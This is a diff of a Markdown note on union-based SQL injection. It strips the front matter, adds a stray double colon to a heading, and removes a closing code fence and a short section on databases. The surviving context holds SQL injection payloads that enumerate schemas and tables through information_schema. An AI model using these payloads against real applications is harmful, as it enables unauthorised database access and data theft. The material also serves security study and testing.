@@ -1,8 +1,3 @@
----
-title: SQL Injection - Union-Based Attacks
-tags: [sql-injection, security, union-based]
----
-
 # SQL Injection - Union-Based Attacks
 
 ## Overview
@@ -64,7 +59,7 @@ Replace each NULL with a string to find which columns display data:
 ```sql
 ' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
 ```
-**List all tables (from all databases):**
+**List all tables (from all databases)::**
 ```sql
 ' UNION SELECT NULL,table_name FROM information_schema.tables--
 ```
@@ -102,16 +97,6 @@ CONCAT_WS(':', username, password)
 
 -- PostgreSQL
 str1 || str2 || str3
-
--- SQL Server
-str1 + str2 + str3
-```
-
-### Using UNION in Different Databases
-- **MySQL**: `UNION` is standard
-- **PostgreSQL**: `UNION` is standard
-- **Oracle**: `UNION` is standard
-- **MSSQL**: `UNION` is standard
 
 -- Oracle
 str1 || str2 || str3
